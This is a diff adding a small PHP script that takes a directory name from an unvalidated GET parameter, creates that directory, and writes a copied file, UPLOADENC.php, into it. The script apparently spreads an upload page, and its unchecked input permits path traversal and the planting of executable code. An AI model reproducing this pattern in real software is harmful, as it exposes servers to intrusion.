@@ -1,0 +1,25 @@
+<?php
+
+$DIR=$_GET["data"];
+
+if( is_dir($DIR) === false )
+{
+    mkdir($DIR);
+
+    
+    
+    $UET = fopen("UPLOADENC.txt", "r") or die("Unable to open file!");
+    $UETC=fread($UET,filesize("UPLOADENC.txt"));
+    fclose($UET);
+    
+    $WUET = fopen($DIR.'/'.'UPLOADENC.php', "w") or die("Unable to open file!");
+    fwrite($WUET,$UETC);
+    fclose($WUET);
+    
+    
+    
+}
+
+
+
+?>
